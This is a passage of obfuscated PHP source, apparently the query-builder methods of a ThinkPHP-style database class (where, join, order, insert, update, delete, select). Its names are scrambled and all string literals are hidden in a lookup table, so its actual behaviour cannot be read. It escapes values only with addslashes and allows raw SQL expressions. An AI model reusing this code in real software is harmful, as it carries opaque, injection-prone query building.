parseSet($±ìèò •) { $ŠÅ¸Äöì =& $_SERVER[¶Ô„œ…¯]; foreach ($±ìèò • as $àµË°ê => $ï”‡Éú¢) { if (is_array($ï”‡Éú¢) && $ŠÅ¸Äöì[374] == $ï”‡Éú¢[0]) { $“¦ñ¾ï[] = $this->parseKey($àµË°ê) . $ŠÅ¸Äöì[508] . $ï”‡Éú¢[1]; } elseif (is_scalar($ï”‡Éú¢) || is_null($ï”‡Éú¢)) { $“¦ñ¾ï[] = $this->parseKey($àµË°ê) . $ŠÅ¸Äöì[508] . $this->parseValue($ï”‡Éú¢); } } return $ŠÅ¸Äöì[1079] . implode($ŠÅ¸Äöì[50], $“¦ñ¾ï); } protected function bindParam($åÌÏ†¾É, $õé³•„÷) { $this->bind[$_SERVER[¶Ô„œ…¯][4] . $åÌÏ†¾É] = $õé³•„÷; } protected function parseBind($£’şîÖÆ) { $£’şîÖÆ = array_merge($this->bind, $£’şîÖÆ); $this->bind = array(); return $£’şîÖÆ; } function parseKey(&$»„í÷, $‘ÔÒÄÓ = true) { if ($‘ÔÒÄÓ) { $»„í÷ = $this->parseKeyCheck($»„í÷); } return $»„í÷; } function parseKeyCheck($ƒª×¬Êš) { $ˆ×„¤ö =& $_SERVER[¶Ô„œ…¯]; $ƒª×¬Êš = trim($ƒª×¬Êš); if (!preg_match($ˆ×„¤ö[1080], $ƒª×¬Êš)) { think_exception($ˆ×„¤ö[1081] . $ƒª×¬Êš); } return $ƒª×¬Êš; } protected function parseValue($‘úº¬ˆ) { $Àó¶‹™ =& $_SERVER[¶Ô„œ…¯]; if (is_string($‘úº¬ˆ)) { $‘úº¬ˆ = $Àó¶‹™[1041] . $this->escapeString($‘úº¬ˆ) . $Àó¶‹™[1041]; } elseif (isset($‘úº¬ˆ[0]) && is_string($‘úº¬ˆ[0]) && strtolower($‘úº¬ˆ[0]) == $Àó¶‹™[374]) { $‘úº¬ˆ = $this->escapeString($‘úº¬ˆ[1]); } elseif (is_array($‘úº¬ˆ)) { $‘úº¬ˆ = array_map(array($this, $Àó¶‹™[1042]), $‘úº¬ˆ); } elseif (is_bool($‘úº¬ˆ)) { $‘úº¬ˆ = $‘úº¬ˆ ? $Àó¶‹™[91] : $Àó¶‹™[230]; } elseif (is_null($‘úº¬ˆ)) { $‘úº¬ˆ = $Àó¶‹™[106]; } return $‘úº¬ˆ; } protected function parseField($èÌ¤Ãš’) { $¯Æ¶”Ç =& $_SERVER[¶Ô„œ…¯]; if (is_string($èÌ¤Ãš’) && strpos($èÌ¤Ãš’, $¯Æ¶”Ç[50])) { $èÌ¤Ãš’ = explode($¯Æ¶”Ç[50], $èÌ¤Ãš’); } if (is_array($èÌ¤Ãš’)) { $ü³ÊÂŞÑ = array(); foreach ($èÌ¤Ãš’ as $´Áì®ëô => $€ã‡Ğ©) { if (!is_numeric($´Áì®ëô)) { $ü³ÊÂŞÑ[] = $this->parseKey($´Áì®ëô, !1) . $¯Æ¶”Ç[1082] . $this->parseKey($€ã‡Ğ©); } else { $ü³ÊÂŞÑ[] = $this->parseKey($€ã‡Ğ©); } } $ëçêŞš„ = implode($¯Æ¶”Ç[50], $ü³ÊÂŞÑ); } elseif (is_string($èÌ¤Ãš’) && !empty($èÌ¤Ãš’)) { $ëçêŞš„ = $èÌ¤Ãš’; } else { $ëçêŞš„ = $¯Æ¶”Ç[222]; } return $ëçêŞš„; } protected function parseTable($òºæ˜•¡) { $ï¿´¾¿¼ =& $_SERVER[¶Ô„œ…¯]; if (is_array($òºæ˜•¡)) { $¨ªƒ¥£ = array(); foreach ($òºæ˜•¡ as $‘‚æ°äŠ => $§­œŒµ›) { if (!is_numeric($‘‚æ°äŠ)) { $¨ªƒ¥£[] = $this->parseKey($‘‚æ°äŠ) . $ï¿´¾¿¼[53] . $this->parseKey($§­œŒµ›); } else { $¨ªƒ¥£[] = $this->parseKey($‘‚æ°äŠ); } } $òºæ˜•¡ = $¨ªƒ¥£; } elseif (is_string($òºæ˜•¡)) { if (strstr($òºæ˜•¡, $ï¿´¾¿¼[53])) { return $òºæ˜•¡; } $òºæ˜•¡ = explode($ï¿´¾¿¼[50], $òºæ˜•¡); array_walk($òºæ˜•¡, array($this, $ï¿´¾¿¼[990])); } return $ï¿´¾¿¼[984] . trim(implode($ï¿´¾¿¼[1083], $òºæ˜•¡), $ï¿´¾¿¼[463]) . $ï¿´¾¿¼[984]; } protected function parseWhere($Ğ±©«¯İ) { $’Í˜×ªß =& $_SERVER[¶Ô„œ…¯]; $ÍïÚ¸× = $’Í˜×ªß[12]; if (is_string($Ğ±©«¯İ)) { $ÍïÚ¸× = $Ğ±©«¯İ; } else { $ë”³ÚÛ = isset($Ğ±©«¯İ[$’Í˜×ªß[1084]]) ? strtoupper($Ğ±©«¯İ[$’Í˜×ªß[1084]]) : $’Í˜×ªß[12]; if (in_array($ë”³ÚÛ, array($’Í˜×ªß[1085], $’Í˜×ªß[1086], $’Í˜×ªß[1087]))) { $ë”³ÚÛ = $’Í˜×ªß[53] . $ë”³ÚÛ . $’Í˜×ªß[53]; unset($Ğ±©«¯İ[$’Í˜×ªß[1084]]); } else { $ë”³ÚÛ = $’Í˜×ªß[1088]; } foreach ($Ğ±©«¯İ as $À¿×ôÑ¨ => $¼Ï–Š¾) { $ÍïÚ¸× .= $’Í˜×ªß[356]; if (is_numeric($À¿×ôÑ¨)) { $À¿×ôÑ¨ = $’Í˜×ªß[1089]; } if (0 === strpos($À¿×ôÑ¨, $’Í˜×ªß[11])) { $ÍïÚ¸× .= $this->parseThinkWhere($À¿×ôÑ¨, $¼Ï–Š¾); } else { if (!preg_match($’Í˜×ªß[1090], trim($À¿×ôÑ¨))) { think_exception(think_lang($’Í˜×ªß[1091]) . $’Í˜×ªß[4] . $À¿×ôÑ¨); } $ï°òóŠê = is_array($¼Ï–Š¾) && isset($¼Ï–Š¾[$’Í˜×ªß[1092]]); $À¿×ôÑ¨ = trim($À¿×ôÑ¨); if (strpos($À¿×ôÑ¨, $’Í˜×ªß[214])) { $„´å“¼ = explode($’Í˜×ªß[214], $À¿×ôÑ¨); $˜˜šëÒĞ = array(); foreach ($„´å“¼ as $üûû¬§ù => $ªÕÄ‹ş­) { $ıãûóÄ = $ï°òóŠê ? $¼Ï–Š¾[$üûû¬§ù] : $¼Ï–Š¾; $˜˜šëÒĞ[] = $’Í˜×ªß[339] . $this->parseWhereItem($this->parseKey($ªÕÄ‹ş­), $ıãûóÄ) . $’Í˜×ªß[989]; } $ÍïÚ¸× .= implode($’Í˜×ªß[1093], $˜˜šëÒĞ); } elseif (strpos($À¿×ôÑ¨, $’Í˜×ªß[286])) { $„´å“¼ = explode($’Í˜×ªß[286], $À¿×ôÑ¨); $˜˜šëÒĞ = array(); foreach ($„´å“¼ as $üûû¬§ù => $ªÕÄ‹ş­) { $ıãûóÄ = $ï°òóŠê ? $¼Ï–Š¾[$üûû¬§ù] : $¼Ï–Š¾; $˜˜šëÒĞ[] = $’Í˜×ªß[339] . $this->parseWhereItem($this->parseKey($ªÕÄ‹ş­), $ıãûóÄ) . $’Í˜×ªß[989]; } $ÍïÚ¸× .= implode($’Í˜×ªß[1088], $˜˜šëÒĞ); } else { $ÍïÚ¸× .= $this->parseWhereItem($this->parseKey($À¿×ôÑ¨), $¼Ï–Š¾); } } $ÍïÚ¸× .= $’Í˜×ªß[357] . $ë”³ÚÛ; } $ÍïÚ¸× = substr($ÍïÚ¸×, 0, -strlen($ë”³ÚÛ)); } return empty($ÍïÚ¸×) ? $’Í˜×ªß[12] : $’Í˜×ªß[1094] . $ÍïÚ¸×; } protected function parseWhereItem($Ùï÷€¥Ô, $‡Ïş¥€ä) { $Üàˆé’æ =& $_SERVER[¶Ô„œ…¯]; $š’ªéô = $Üàˆé’æ[12]; if (is_array($‡Ïş¥€ä)) { if (is_string($‡Ïş¥€ä[0])) { $±šàÌÅ = strtolower($‡Ïş¥€ä[0]); if (in_array($‡Ïş¥€ä[0], array($Üàˆé’æ[508], $Üàˆé’æ[1095], $Üàˆé’æ[1096], $Üàˆé’æ[1097], $Üàˆé’æ[1098], $Üàˆé’æ[1099]))) { $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[53] . $‡Ïş¥€ä[0] . $Üàˆé’æ[53] . $this->parseValue($‡Ïş¥€ä[1]); } elseif (preg_match($Üàˆé’æ[1100], $‡Ïş¥€ä[0])) { $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[53] . $this->parseValue($‡Ïş¥€ä[1]); } elseif (preg_match($Üàˆé’æ[1101], $‡Ïş¥€ä[0])) { if (is_array($‡Ïş¥€ä[1])) { $‡ÄÏú¶³ = isset($‡Ïş¥€ä[2]) ? strtoupper($‡Ïş¥€ä[2]) : $Üàˆé’æ[1086]; if (in_array($‡ÄÏú¶³, array($Üàˆé’æ[1085], $Üàˆé’æ[1086], $Üàˆé’æ[1087]))) { $·¿¼ŠÜá = array(); foreach ($‡Ïş¥€ä[1] as $…è·æ÷) { $·¿¼ŠÜá[] = $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[53] . $this->parseValue($…è·æ÷); } $š’ªéô .= $Üàˆé’æ[339] . implode($Üàˆé’æ[53] . $‡ÄÏú¶³ . $Üàˆé’æ[53], $·¿¼ŠÜá) . $Üàˆé’æ[989]; } } else { $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[53] . $this->parseValue($‡Ïş¥€ä[1]); } } elseif ($Üàˆé’æ[374] == $±šàÌÅ) { $š’ªéô .= $Üàˆé’æ[987] . $Ùï÷€¥Ô . $Üàˆé’æ[53] . $‡Ïş¥€ä[1] . $Üàˆé’æ[1102]; } elseif (preg_match($Üàˆé’æ[1103], $‡Ïş¥€ä[0])) { $š’ªéô .= $‡Ïş¥€ä[0]; } elseif (preg_match($Üàˆé’æ[1104], $‡Ïş¥€ä[0])) { if (isset($‡Ïş¥€ä[2]) && $Üàˆé’æ[374] == $‡Ïş¥€ä[2]) { $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[53] . $‡Ïş¥€ä[1]; } else { if (is_string($‡Ïş¥€ä[1])) { $‡Ïş¥€ä[1] = explode($Üàˆé’æ[50], $‡Ïş¥€ä[1]); } $ÕÔÏ…³¿ = implode($Üàˆé’æ[50], $this->parseValue($‡Ïş¥€ä[1])); $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[987] . $ÕÔÏ…³¿ . $Üàˆé’æ[989]; } } elseif (preg_match($Üàˆé’æ[1105], $‡Ïş¥€ä[0])) { $£¤ÂÁÒü = is_string($‡Ïş¥€ä[1]) ? explode($Üàˆé’æ[50], $‡Ïş¥€ä[1]) : $‡Ïş¥€ä[1]; $š’ªéô .= $Üàˆé’æ[987] . $Ùï÷€¥Ô . $Üàˆé’æ[53] . $this->exp[$±šàÌÅ] . $Üàˆé’æ[53] . $this->parseValue($£¤ÂÁÒü[0]) . $Üàˆé’æ[1088] . $this->parseValue($£¤ÂÁÒü[1]) . $Üàˆé’æ[357]; } else { think_exception(think_lang($Üàˆé’æ[1091]) . $Üàˆé’æ[4] . $‡Ïş¥€ä[0]); } } else { $„ÄÖ÷‘› = count($‡Ïş¥€ä); $ïå Œì” = $Üàˆé’æ[12]; if (is_string($‡Ïş¥€ä[$„ÄÖ÷‘› - 1])) { $ïå Œì” = isset($‡Ïş¥€ä[$„ÄÖ÷‘› - 1]) ? strtoupper($‡Ïş¥€ä[$„ÄÖ÷‘› - 1]) : $Üàˆé’æ[12]; if (in_array($ïå Œì”, array($Üàˆé’æ[1085], $Üàˆé’æ[1086], $Üàˆé’æ[1087]))) { $„ÄÖ÷‘› = $„ÄÖ÷‘› - 1; } } else { $ïå Œì” = $Üàˆé’æ[1085]; } for ($èáœË¤ş = 0; $èáœË¤ş < $„ÄÖ÷‘›; $èáœË¤ş++) { $£¤ÂÁÒü = is_array($‡Ïş¥€ä[$èáœË¤ş]) ? $‡Ïş¥€ä[$èáœË¤ş][1] : $‡Ïş¥€ä[$èáœË¤ş]; if ($Üàˆé’æ[374] == strtolower($‡Ïş¥€ä[$èáœË¤ş][0])) { $š’ªéô .= $Üàˆé’æ[339] . $Ùï÷€¥Ô . $Üàˆé’æ[53] . $£¤ÂÁÒü . $Üàˆé’æ[1102] . $ïå Œì” . $Üàˆé’æ[53]; } else { $¨è–î‘× = is_array($‡Ïş¥€ä[$èáœË¤ş]) ? $this->exp[strtolower($‡Ïş¥€ä[$èáœË¤ş][0])] : $Üàˆé’æ[508]; if (!$¨è–î‘× && is_array($‡Ïş¥€ä[$èáœË¤ş]) && in_array($‡Ïş¥€ä[$èáœË¤ş][0], array($Üàˆé’æ[508], $Üàˆé’æ[1095], $Üàˆé’æ[1096], $Üàˆé’æ[1097], $Üàˆé’æ[1098], $Üàˆé’æ[1099]))) { $¨è–î‘× = $‡Ïş¥€ä[$èáœË¤ş][0]; } $š’ªéô .= $Üàˆé’æ[339] . $Ùï÷€¥Ô . $Üàˆé’æ[53] . $¨è–î‘× . $Üàˆé’æ[53] . $this->parseValue($£¤ÂÁÒü) . $Üàˆé’æ[1102] . $ïå Œì” . $Üàˆé’æ[53]; } } $š’ªéô = substr($š’ªéô, 0, -4); } } else { $š’ªéô .= $Ùï÷€¥Ô . $Üàˆé’æ[1106] . $this->parseValue($‡Ïş¥€ä); } return $š’ªéô; } protected function parseThinkWhere($±®ë€ù, $¡ñ¦áûÄ) { $éıûáÃ“ =& $_SERVER[¶Ô„œ…¯]; $òµ§§ê = $éıûáÃ“[12]; switch ($±®ë€ù) { case $éıûáÃ“[429]: $òµ§§ê = $¡ñ¦áûÄ; break; case $éıûáÃ“[1089]: $òµ§§ê = is_string($¡ñ¦áûÄ) ? $¡ñ¦áûÄ : substr($this->parseWhere($¡ñ¦áûÄ), 6); break; case $éıûáÃ“[1107]: parse_str($¡ñ¦áûÄ, $Ş´Æà¼î); if (isset($Ş´Æà¼î[$éıûáÃ“[1084]])) { $°–ß™â = $éıûáÃ“[53] . strtoupper($Ş´Æà¼î[$éıûáÃ“[1084]]) . $éıûáÃ“[53]; unset($Ş´Æà¼î[$éıûáÃ“[1084]]); } else { $°–ß™â = $éıûáÃ“[1088]; } $ÚÌÆ¸©· = array(); foreach ($Ş´Æà¼î as $ó¾‹£Ã => $÷¢¹³¹ü) { $ÚÌÆ¸©·[] = $this->parseKey($ó¾‹£Ã) . $éıûáÃ“[1106] . $this->parseValue($÷¢¹³¹ü); } $òµ§§ê = implode($°–ß™â, $ÚÌÆ¸©·); break; } return $òµ§§ê; } protected function parseLimit($ü¶®÷Ğ) { $Ïúó„“ =& $_SERVER[¶Ô„œ…¯]; return !empty($ü¶®÷Ğ) ? $Ïúó„“[51] . $ü¶®÷Ğ . $Ïúó„“[53] : $Ïúó„“[12]; } protected function parseJoin($¼Ã£¯¬ƒ) { $ã¨¶¸Ìü =& $_SERVER[¶Ô„œ…¯]; $ó¶–ìÊ° = $ã¨¶¸Ìü[12]; if (!empty($¼Ã£¯¬ƒ)) { if (is_array($¼Ã£¯¬ƒ)) { foreach ($¼Ã£¯¬ƒ as $ˆã™¹ûù => $®€ããÑ) { if (!1 !== stripos($®€ããÑ, $ã¨¶¸Ìü[1108])) { $ó¶–ìÊ° .= $ã¨¶¸Ìü[53] . $®€ããÑ; } else { $ó¶–ìÊ° .= $ã¨¶¸Ìü[1109] . $®€ããÑ; } } } else { $ó¶–ìÊ° .= $ã¨¶¸Ìü[1109] . $¼Ã£¯¬ƒ; } } $ó¶–ìÊ° = preg_replace($ã¨¶¸Ìü[1110], think_config($ã¨¶¸Ìü[1014]) . $ã¨¶¸Ìü[1111], $ó¶–ìÊ°); return $ó¶–ìÊ°; } protected function parseOrder($İÑåË) { $ïùÁ‹š =& $_SERVER[¶Ô„œ…¯]; if (is_array($İÑåË)) { $Ö¢ñ³õ = array(); foreach ($İÑåË as $ÁÂœÇÕó => $ÆÈËø¸¿) { if (is_numeric($ÁÂœÇÕó)) { $Ö¢ñ³õ[] = $this->parseKey($ÆÈËø¸¿); } else { $ÆÈËø¸¿ = in_array(strtoupper(trim($ÆÈËø¸¿)), array($ïùÁ‹š[1112], $ïùÁ‹š[1113])) ? $ïùÁ‹š[53] . $ÆÈËø¸¿ : $ïùÁ‹š[12]; if (preg_match($ïùÁ‹š[1114], $ÁÂœÇÕó)) { $Ö¢ñ³õ[] = $this->parseKey($ÁÂœÇÕó) . $ÆÈËø¸¿; } else { think_exception($ïùÁ‹š[1115] . $ÁÂœÇÕó); } } } $İÑåË = implode($ïùÁ‹š[50], $Ö¢ñ³õ); } return !empty($İÑåË) ? $ïùÁ‹š[1116] . $İÑåË : $ïùÁ‹š[12]; } protected function parseGroup($¬æÏ×Ù) { $×ç×«·ƒ =& $_SERVER[¶Ô„œ…¯]; return !empty($¬æÏ×Ù) ? $×ç×«·ƒ[1117] . $¬æÏ×Ù : $×ç×«·ƒ[12]; } protected function parseHaving($‡í£ª–”) { $¥£Ÿß…¼ =& $_SERVER[¶Ô„œ…¯]; return !empty($‡í£ª–”) ? $¥£Ÿß…¼[1118] . $‡í£ª–” : $¥£Ÿß…¼[12]; } protected function parseComment($•Õ‚‡‹ ) { $‹Òõ»Ğ =& $_SERVER[¶Ô„œ…¯]; return !empty($•Õ‚‡‹ ) ? $‹Òõ»Ğ[1119] . $•Õ‚‡‹  . $‹Òõ»Ğ[1120] : $‹Òõ»Ğ[12]; } protected function parseDistinct($ıêÚÏ¶å) { $ïèšÉ¯İ =& $_SERVER[¶Ô„œ…¯]; return !empty($ıêÚÏ¶å) ? $ïèšÉ¯İ[1121] : $ïèšÉ¯İ[12]; } protected function parseUnion($ïçØñÔ¡) { $–«İÖº¢ =& $_SERVER[¶Ô„œ…¯]; if (empty($ïçØñÔ¡)) { return $–«İÖº¢[12]; } if (isset($ïçØñÔ¡[$–«İÖº¢[425]])) { $¦ïŠ¾Îå = $–«İÖº¢[1122]; unset($ïçØñÔ¡[$–«İÖº¢[425]]); } else { $¦ïŠ¾Îå = $–«İÖº¢[1123]; } foreach ($ïçØñÔ¡ as $×ºó®¶¸) { $›»Õˆ·Ñ[] = $¦ïŠ¾Îå . (is_array($×ºó®¶¸) ? $this->buildSelectSql($×ºó®¶¸) : $×ºó®¶¸); } return implode($–«İÖº¢[53], $›»Õˆ·Ñ); } public function insert($Â˜——¨–, $¥¢³õşê = array(), $ÁõšÅı = false) { $î‰¦ã‚ =& $_SERVER[¶Ô„œ…¯]; $ñùå•Ğù = $ãÛÈ« = array(); $this->model = $¥¢³õşê[$î‰¦ã‚[360]]; foreach ($Â˜——¨– as $‡¢¬Äêë => $Ñ¦ï À) { if (is_array($Ñ¦ï À) && $î‰¦ã‚[374] == $Ñ¦ï À[0]) { $ãÛÈ«[] = $this->parseKey($‡¢¬Äêë); $ñùå•Ğù[] = $Ñ¦ï À[1]; } elseif (is_scalar($Ñ¦ï À) || is_null($Ñ¦ï À)) { $ãÛÈ«[] = $this->parseKey($‡¢¬Äêë); $ñùå•Ğù[] = $this->parseValue($Ñ¦ï À); } } $‘õù™ËÇ = ($ÁõšÅı ? $î‰¦ã‚[991] : $î‰¦ã‚[992]) . $î‰¦ã‚[993] . $this->parseTable($¥¢³õşê[$î‰¦ã‚[358]]) . $î‰¦ã‚[987] . implode($î‰¦ã‚[50], $ãÛÈ«) . $î‰¦ã‚[988] . implode($î‰¦ã‚[50], $ñùå•Ğù) . $î‰¦ã‚[989]; $‘õù™ËÇ .= $this->parseLock(isset($¥¢³õşê[$î‰¦ã‚[930]]) ? $¥¢³õşê[$î‰¦ã‚[930]] : !1); $‘õù™ËÇ .= $this->parseComment(!empty($¥¢³õşê[$î‰¦ã‚[431]]) ? $¥¢³õşê[$î‰¦ã‚[431]] : $î‰¦ã‚[12]); return $this->execute($‘õù™ËÇ, $this->parseBind(!empty($¥¢³õşê[$î‰¦ã‚[362]]) ? $¥¢³õşê[$î‰¦ã‚[362]] : array())); } public function selectInsert($‚ºÂßØÙ, $»Å ªŸğ, $¾ÙÊäá­ = array()) { $‘Ó±°«ï =& $_SERVER[¶Ô„œ…¯]; $this->model = $¾ÙÊäá­[$‘Ó±°«ï[360]]; if (is_string($‚ºÂßØÙ)) { $‚ºÂßØÙ = explode($‘Ó±°«ï[50], $‚ºÂßØÙ); } array_walk($‚ºÂßØÙ, array($this, $‘Ó±°«ï[990])); $Òâ‡Ó‚ª = $‘Ó±°«ï[1124] . $this->parseTable($»Å ªŸğ) . $‘Ó±°«ï[987] . implode($‘Ó±°«ï[50], $‚ºÂßØÙ) . $‘Ó±°«ï[1102]; $Òâ‡Ó‚ª .= $this->buildSelectSql($¾ÙÊäá­); return $this->execute($Òâ‡Ó‚ª, $this->parseBind(!empty($¾ÙÊäá­[$‘Ó±°«ï[362]]) ? $¾ÙÊäá­[$‘Ó±°«ï[362]] : array())); } public function update($ú·¡Ù¶ó, $ñ›¨İáÛ) { $ ­“¯µ =& $_SERVER[¶Ô„œ…¯]; $this->model = $ñ›¨İáÛ[$ ­“¯µ[360]]; $¤Çªıê÷ = $ ­“¯µ[1125] . $this->parseTable($ñ›¨İáÛ[$ ­“¯µ[358]]) . $this->parseSet($ú·¡Ù¶ó) . $this->parseWhere(!empty($ñ›¨İáÛ[$ ­“¯µ[354]]) ? $ñ›¨İáÛ[$ ­“¯µ[354]] : $ ­“¯µ[12]) . $this->parseOrder(!empty($ñ›¨İáÛ[$ ­“¯µ[443]]) ? $ñ›¨İáÛ[$ ­“¯µ[443]] : $ ­“¯µ[12]) . $this->parseLimit(!empty($ñ›¨İáÛ[$ ­“¯µ[369]]) ? $ñ›¨İáÛ[$ ­“¯µ[369]] : $ ­“¯µ[12]) . $this->parseLock(isset($ñ›¨İáÛ[$ ­“¯µ[930]]) ? $ñ›¨İáÛ[$ ­“¯µ[930]] : !1) . $this->parseComment(!empty($ñ›¨İáÛ[$ ­“¯µ[431]]) ? $ñ›¨İáÛ[$ ­“¯µ[431]] : $ ­“¯µ[12]); return $this->execute($¤Çªıê÷, $this->parseBind(!empty($ñ›¨İáÛ[$ ­“¯µ[362]]) ? $ñ›¨İáÛ[$ ­“¯µ[362]] : array())); } public function delete($®ñ†ÍËº = array()) { $·€Šèı´ =& $_SERVER[¶Ô„œ…¯]; $this->model = $®ñ†ÍËº[$·€Šèı´[360]]; $»¦„¸è = $·€Šèı´[1126] . $this->parseTable($®ñ†ÍËº[$·€Šèı´[358]]) . $this->parseWhere(!empty($®ñ†ÍËº[$·€Šèı´[354]]) ? $®ñ†ÍËº[$·€Šèı´[354]] : $·€Šèı´[12]) . $this->parseOrder(!empty($®ñ†ÍËº[$·€Šèı´[443]]) ? $®ñ†ÍËº[$·€Šèı´[443]] : $·€Šèı´[12]) . $this->parseLimit(!empty($®ñ†ÍËº[$·€Šèı´[369]]) ? $®ñ†ÍËº[$·€Šèı´[369]] : $·€Šèı´[12]) . $this->parseLock(isset($®ñ†ÍËº[$·€Šèı´[930]]) ? $®ñ†ÍËº[$·€Šèı´[930]] : !1) . $this->parseComment(!empty($®ñ†ÍËº[$·€Šèı´[431]]) ? $®ñ†ÍËº[$·€Šèı´[431]] : $·€Šèı´[12]); return $this->execute($»¦„¸è, $this->parseBind(!empty($®ñ†ÍËº[$·€Šèı´[362]]) ? $®ñ†ÍËº[$·€Šèı´[362]] : array())); } public function select($úÎŠ€Ë† = array()) { $¦ì¶îÛç =& $_SERVER[¶Ô„œ…¯]; $this->model = $úÎŠ€Ë†[$¦ì¶îÛç[360]]; $åéÅ©×˜ = $this->buildSelectSql($úÎŠ€Ë†); $Œ¦ë‡ûÔ = isset($úÎŠ€Ë†[$¦ì¶îÛç[426]]) ? $úÎŠ€Ë†[$¦ì¶îÛç[426]] : !1; if ($Œ¦ë‡ûÔ) { $ûØ»³íÛ = is_string($Œ¦ë‡ûÔ[$¦ì¶îÛç[97]]) ? $Œ¦ë‡ûÔ[$¦ì¶îÛç[97]] : $¦ì¶îÛç[1127] . md5($åéÅ©×˜); $ß¢»Ó = think_cache($ûØ»³íÛ, $¦ì¶îÛç[12], $Œ¦ë‡ûÔ); if (!1 !== $ß¢»Ó) { return $ß¢»Ó; } } $…¬È¤’ = $this->query($åéÅ©×˜, $this->parseBind(!empty($úÎŠ€Ë†[$¦ì¶îÛç[362]]) ? $úÎŠ€Ë†[$¦ì¶îÛç[362]] : array())); if ($Œ¦ë‡ûÔ && !1 !== $…¬È¤’) { think_cache($ûØ»³íÛ, $…¬È¤’, $Œ¦ë‡ûÔ); } return $…¬È¤’; } public function buildSelectSql($éªú¼Ğ = array()) { $Û—ßÜ°ã =& $_SERVER[¶Ô„œ…¯]; if (isset($éªú¼Ğ[$Û—ßÜ°ã[430]])) { if (strpos($éªú¼Ğ[$Û—ßÜ°ã[430]], $Û—ßÜ°ã[50])) { list($ñš·Ç“Ë, $³ñøÔ÷÷) = explode($Û—ßÜ°ã[50], $éªú¼Ğ[$Û—ßÜ°ã[430]]); } else { $ñš·Ç“Ë = $éªú¼Ğ[$Û—ßÜ°ã[430]]; } $ñš·Ç“Ë = $ñš·Ç“Ë ? $ñš·Ç“Ë : 1; $³ñøÔ÷÷ = isset($³ñøÔ÷÷) ? $³ñøÔ÷÷ : (is_numeric($éªú¼Ğ[$Û—ßÜ°ã[369]]) ? $éªú¼Ğ[$Û—ßÜ°ã[369]] : 20); $ Ÿ¼±Ìã = $³ñøÔ÷÷ * ((int) $ñš·Ç“Ë - 1); $éªú¼Ğ[$Û—ßÜ°ã[369]] = $ Ÿ¼±Ìã . $Û—ßÜ°ã[50] . $³ñøÔ÷÷; } if (think_config($Û—ßÜ°ã[1128])) { $€»º‘¤ = $Û—ßÜ°ã[1129] . md5(serialize($éªú¼Ğ)); $‰¦¶‘¥¥ = think_cache($€»º‘¤); if ($‰¦¶‘¥¥) { return $‰¦¶‘¥¥; } } $˜Í©°ù’ = $this->parseSql($this->selectSql, $éªú¼Ğ); $˜Í©°ù’ .= $this->parseLock(isset($éªú¼Ğ[$Û—ßÜ°ã[930]]) ? $éªú¼Ğ[$Û—ßÜ°ã[930]] : !1); if (isset($€»º‘¤)) { think_cache($€»º‘¤, $˜Í©°ù’); } return $˜Í©°ù’; } public function parseSql($ğÂœ·Ğ, $ŞÊË¯ñ½ = array()) { $±ÉßùÓ =& $_SERVER[¶Ô„œ…¯]; $ğÂœ·Ğ = str_replace(array($±ÉßùÓ[1130], $±ÉßùÓ[1131], $±ÉßùÓ[1132], $±ÉßùÓ[1133], $±ÉßùÓ[1134], $±ÉßùÓ[1135], $±ÉßùÓ[1136], $±ÉßùÓ[1137], $±ÉßùÓ[1138], $±ÉßùÓ[1139], $±ÉßùÓ[1140]), array($this->parseTable("{$ŞÊË¯ñ½[$±ÉßùÓ[358]]}"), $this->parseDistinct(isset($ŞÊË¯ñ½[$±ÉßùÓ[1141]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[1141]] : !1), $this->parseField(!empty($ŞÊË¯ñ½[$±ÉßùÓ[352]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[352]] : $±ÉßùÓ[222]), $this->parseJoin(!empty($ŞÊË¯ñ½[$±ÉßùÓ[361]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[361]] : $±ÉßùÓ[12]), $this->parseWhere(!empty($ŞÊË¯ñ½[$±ÉßùÓ[354]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[354]] : $±ÉßùÓ[12]), $this->parseGroup(!empty($ŞÊË¯ñ½[$±ÉßùÓ[580]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[580]] : $±ÉßùÓ[12]), $this->parseHaving(!empty($ŞÊË¯ñ½[$±ÉßùÓ[1142]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[1142]] : $±ÉßùÓ[12]), $this->parseOrder(!empty($ŞÊË¯ñ½[$±ÉßùÓ[443]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[443]] : $±ÉßùÓ[12]), $this->parseLimit(!empty($ŞÊË¯ñ½[$±ÉßùÓ[369]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[369]] : $±ÉßùÓ[12]), $this->parseUnion(!empty($ŞÊË¯ñ½[$±ÉßùÓ[424]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[424]] : $±ÉßùÓ[12]), $this->parseComment(!empty($ŞÊË¯ñ½[$±ÉßùÓ[431]]) ? $ŞÊË¯ñ½[$±ÉßùÓ[431]] : $±ÉßùÓ[12])), $ğÂœ·Ğ); return $ğÂœ·Ğ; } public function getLastSql($ı”ÖØø† = '') { return $ı”ÖØø† ? $this->modelSql[$ı”ÖØø†] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($¼¶½îî) { return addslashes($¼¶½îî); } public function setModel($šÈâû«Á) { $this->model = $šÈâû«Á; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($è—¾ü®ë = array()) { $ø¡‹æ¡ =& $_SERVER[¶Ô„œ…¯]; if (empty($è—¾ü®ë)) { $è—¾ü®ë = $GLOBALS[$ø¡‹æ¡[6]][$ø¡‹æ¡[21]]; } $this->database = $è—¾ü®ë; } public function model($Ö ¾ş©õ = '') { return new ModelBase($Ö ¾ş©õ, $_SERVER[¶Ô„œ…¯][12], $this->database); } public function db($ı–ªôô” = false) { $Öİ¡ƒç =& $_SERVER[¶Ô„œ…¯]; 